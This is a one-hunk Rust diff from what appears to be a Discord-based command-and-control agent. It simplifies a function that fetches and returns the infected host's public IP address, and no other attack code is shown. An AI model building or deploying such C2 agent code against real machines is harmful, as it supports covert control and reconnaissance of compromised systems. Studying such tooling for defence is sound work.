@@ -12,5 +12,5 @@ pub async fn ip() -> Result<String, DiscordC2Error> {
     let ip = get_public_ip()
         .await
         .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
-    Ok(format!("{}", &ip))
+    Ok(ip)
 }
